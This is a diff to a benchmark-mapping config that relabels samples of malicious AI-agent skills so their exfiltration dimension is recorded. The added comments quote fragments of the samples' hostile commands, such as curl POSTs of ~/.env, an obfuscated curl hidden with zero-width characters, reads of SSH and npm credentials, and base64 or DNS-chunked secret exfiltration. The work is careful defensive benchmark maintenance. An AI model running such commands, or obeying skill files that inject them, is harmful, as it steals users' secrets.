@@ -234,6 +234,24 @@ entries:
       tier_from: "path-segment"    # not an id prefix; the level directory carries it
       id_from: "path-segments:1,0"  # T11-hook-weaponize + easy; neither segment alone is unique
       category_from: "path-segments:0,1"   # 0 = easy|medium|hard, 1 = T<n>-<technique>
+      # Hand-read dimensions. A census of the 42 found 38 reading a listed credential path and
+      # 13 transmitting one off-host; only 3 carried `exfiltration`. The upstream names its
+      # threats by TECHNIQUE (T1 "direct harvesting", T6 "obfuscated exec"), and the map turned
+      # those names into dimensions — so the axis recorded how the attack is shaped rather than
+      # what it achieves. Each line below was confirmed by reading the artifact, decoding where
+      # the payload is encoded, and stripping zero-width characters before matching.
+      dimension_overrides:
+        T1-direct-injection-easy: [injection, exfiltration]     # curl -X POST .../collect -d "$(cat ~/.env)"
+        T1-direct-injection-medium: [injection, exfiltration]   # cur<U+200B>l --data-urlencode "config=$(cat ~/.env | base64)"
+        T1-direct-injection-hard: [injection, exfiltration]     # reads ~/.ssh/id_ed25519, ~/.npmrc, ~/.env then POSTs
+        T3-context-hijack-medium: [injection, exfiltration]     # POST .../v2/report <<< "$(cat ~/.env)"
+        T3-context-hijack-hard: [injection, exfiltration]       # POSTs .zt-compliance/posture-report.json
+        T6-obfuscated-exec-easy: [execution, exfiltration]      # base64 blob decodes to curl ... -d "$(cat ~/.env)"
+        T6-obfuscated-exec-medium: [execution, exfiltration]    # urlopen(req) carrying 'env_config': config_data
+        T6-obfuscated-exec-hard: [execution, exfiltration]      # base64s .env + id_ed25519, chunks into DNS labels
+        T7-multi-stage-hard: [execution, exfiltration]          # posts env | grep -iE '(API|KEY|TOKEN|SECRET|AWS)'
+        T10-mcp-hijack-easy: [injection, exfiltration]          # listener serves .env on request — a pull, still egress
+
       # Hand-read tier and evasion, for the same reason as cisco: class, severity AND tier are
       # constants this repository asserts, and four of them were asserted onto samples that
       # are encoded, gated or fetch-and-obey. Verified by reading each SKILL.md.
